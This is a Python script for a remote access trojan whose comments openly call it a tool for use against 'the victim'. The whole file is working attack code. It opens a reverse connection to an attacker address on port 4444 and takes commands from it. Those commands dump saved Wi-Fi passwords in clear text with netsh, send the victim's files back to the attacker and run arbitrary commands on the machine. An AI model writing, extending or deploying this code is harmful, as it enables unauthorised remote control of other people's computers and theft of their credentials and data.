import socket
import os

# Function to grab Wi-Fi password for a given network name
def grab_wifi(network_name):
    command = f'netsh wlan show profile "{network_name}" key=clear'
    result = os.popen(command).read()
    return result

# Function to upload a file from the victim to the attacker
def upload(file_path):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
            return data
    except Exception as e:
        return f"Error reading file: {e}"

# Function to execute a command or file on the victim's machine
def run(file_path):
    try:
        result = os.popen(file_path).read()
        return result
    except Exception as e:
        return f"Error executing file: {e}"

# Function to handle the connection with the attacker and receive commands
def handle_commands(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            
            if command.lower() == "exit":
                print("[*] Closing connection.")
                client_socket.close()
                break

            elif command.startswith("grab_wifi"):
                network_name = command.split(" ")[1]
                result = grab_wifi(network_name)
                client_socket.send(result.encode('utf-8'))

            elif command.startswith("upload"):
                file_path = command.split(" ")[1]
                result = upload(file_path)
                client_socket.send(result)  # Send file content back

            elif command.startswith("run"):
                file_path = command.split(" ")[1]
                result = run(file_path)
                client_socket.send(result.encode('utf-8'))

            else:
                client_socket.send("Unknown command".encode('utf-8'))

        except Exception as e:
            print(f"Error: {e}")
            break

# Main function to connect to the attacker's server
def connect_to_server():
    server_ip = "10.0.1.12"  # Replace with the attacker's IP address
    server_port = 4444  # The port the listener is listening on

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    print("[*] Connected to the server")

    handle_commands(client_socket)

if __name__ == "__main__":
    connect_to_server()
